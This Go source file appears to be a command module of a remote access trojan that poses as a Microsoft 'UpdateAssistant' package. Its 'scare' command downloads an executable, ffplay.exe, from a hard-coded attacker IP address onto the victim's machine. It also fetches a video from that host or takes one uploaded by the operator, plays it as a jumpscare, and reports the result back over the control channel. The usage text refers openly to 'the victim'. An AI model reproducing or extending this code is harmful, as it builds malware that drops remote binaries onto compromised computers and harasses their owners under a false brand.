package media

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/files"
	ipc "github.com/microsoft/UpdateAssistant/modules/ipc"
	"github.com/microsoft/UpdateAssistant/modules/logger"
	"github.com/microsoft/UpdateAssistant/modules/sysutil"
)

var scareUsage = []string{
	"scare -- play default jumpscare",
	"scare <file> -- upload a video and play it on the victim",
	"scare stop -- stop active jumpscare",
}

const defaultScareURL = "http://150.241.70.38:8080/files/boiled.mp4"
const ffplayDownloadURL = "http://150.241.70.38:8080/files/ffplay.exe"

func ffplayPath() string {
	return filepath.Join(config.DataPath(), "bin", "ffplay.exe")
}

func ensureFFplay() error {
	fp := ffplayPath()
	if info, err := os.Stat(fp); err == nil && info.Size() > 1000000 {
		return nil
	}
	os.Remove(fp)
	if err := os.MkdirAll(filepath.Dir(fp), 0755); err != nil {
		return err
	}
	resp, err := http.Get(ffplayDownloadURL)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	if resp.ContentLength > 0 && resp.ContentLength < 1000000 {
		return fmt.Errorf("file too small (%d bytes)", resp.ContentLength)
	}
	f, err := os.Create(fp)
	if err != nil {
		return err
	}
	_, err = io.Copy(f, resp.Body)
	f.Close()
	if err != nil {
		os.Remove(fp)
		return err
	}
	if info, err := os.Stat(fp); err != nil || info.Size() < 1000000 {
		os.Remove(fp)
		return fmt.Errorf("downloaded file too small or missing")
	}
	return nil
}

func Scare(c *ipc.Context) error {
	arg := c.ArgString()

	if arg == "stop" {
		n := sysutil.ScareStop()
		if n == 1 {
			return c.ReplyEmbed(ipc.Success("jumpscare stopped"))
		}
		return c.ReplyEmbed(ipc.Error("no active jumpscare"))
	}

	if sysutil.ScareStatus() {
		return c.ReplyEmbed(ipc.Error("scare already running"))
	}

	go runScare(c)
	return nil
}

func runScare(c *ipc.Context) {
	c.Reply("downloading ffplay...")
	if err := ensureFFplay(); err != nil {
		logger.Error("ensureFFplay failed: %v", err)
		c.ReplyEmbed(ipc.Error("ffplay: " + err.Error()))
		return
	}

	fp := ffplayPath()
	var videoPath string
	var isTemp bool

	if len(c.Attachments) > 0 {
		c.Reply("downloading video...")
		id := c.Attachments[0]
		data, name, err := files.Download(id)
		if err != nil {
			c.ReplyEmbed(ipc.Error("download failed: " + err.Error()))
			return
		}
		ext := filepath.Ext(name)
		if ext == "" {
			ext = ".mp4"
		}
		tmp := filepath.Join(os.TempDir(), fmt.Sprintf("scare_%d%s", time.Now().Unix(), ext))
		if err := os.WriteFile(tmp, data, 0644); err != nil {
			c.ReplyEmbed(ipc.Error("write failed: " + err.Error()))
			return
		}
		videoPath = tmp
		isTemp = true
	} else {
		c.Reply("fetching default video...")
		tmp := filepath.Join(os.TempDir(), fmt.Sprintf("scare_%d.mp4", time.Now().Unix()))
		resp, err := http.Get(defaultScareURL)
		if err != nil {
			c.ReplyEmbed(ipc.Error("download failed: " + err.Error()))
			return
		}
		defer resp.Body.Close()
		if resp.StatusCode != 200 {
			c.ReplyEmbed(ipc.Error(fmt.Sprintf("HTTP %d", resp.StatusCode)))
			return
		}
		f, err := os.Create(tmp)
		if err != nil {
			c.ReplyEmbed(ipc.Error("temp file: " + err.Error()))
			return
		}
		_, err = io.Copy(f, resp.Body)
		f.Close()
		if err != nil {
			os.Remove(tmp)
			c.ReplyEmbed(ipc.Error("download failed: " + err.Error()))
			return
		}
		videoPath = tmp
		isTemp = true
	}

	if info, err := os.Stat(videoPath); err == nil {
		logger.Info("scare video size=%d path=%s", info.Size(), videoPath)
	} else {
		logger.Error("scare video stat failed: %v", err)
	}

	ret := sysutil.ScarePlay(videoPath, fp)
	logger.Info("scare_play returned %d", ret)
	if ret == 0 {
		if isTemp {
			os.Remove(videoPath)
		}
		c.ReplyEmbed(ipc.Error("scare already running"))
		return
	}
	if ret == -1 {
		if isTemp {
			os.Remove(videoPath)
		}
		c.ReplyEmbed(ipc.Error("failed to start"))
		return
	}

	if isTemp {
		go func(p string) {
			time.Sleep(60 * time.Second)
			os.Remove(p)
		}(videoPath)
	}

	c.ReplyEmbed(ipc.Success("jumpscare delivered"))
}
